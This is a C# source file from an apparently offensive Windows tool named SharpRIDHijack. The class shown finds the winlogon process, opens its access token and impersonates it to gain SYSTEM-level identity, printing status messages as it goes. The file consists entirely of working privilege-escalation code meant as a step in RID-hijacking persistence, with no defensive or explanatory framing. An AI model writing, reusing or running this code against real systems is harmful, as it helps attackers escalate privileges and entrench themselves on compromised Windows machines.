using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace SharpRIDHijack
{
    public class system
    {

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool OpenProcessToken(IntPtr processHandle, uint desiredAccess, ref IntPtr tokenHandle);

        public static int GetPID(string procName)
        {
            try
            {
                Process process = Process.GetProcessesByName(procName).FirstOrDefault(); // to not crash
                int pid = process.Id;
                Console.WriteLine($"[+] Impersonating Process: {procName}");
                Console.WriteLine($"[+] Pid: {pid}");
                return pid;
            }
            catch (Exception) { return 0; } // catch a pokemon
        }




        public static bool ImpersonateSystem() {

            IntPtr tokenHandle = IntPtr.Zero;
            int pid = GetPID("winlogon");

            IntPtr processHandle = IntPtr.Zero;
            processHandle = OpenProcess(0x0400, true, pid);

            if (processHandle == IntPtr.Zero)
            {
                Console.WriteLine("OpenProcess Failed");
                return false;
            }

            OpenProcessToken(processHandle, 0x0002 | 0x0001 | 0x0008, ref tokenHandle);

            if (tokenHandle == IntPtr.Zero)
            {
                Console.WriteLine("OpenProcessToken Failed");
                return false;
            }


            // Begin impersonation
            WindowsIdentity identity = new WindowsIdentity(tokenHandle);
            WindowsImpersonationContext context = identity.Impersonate();

            return true;

        }


    }
}
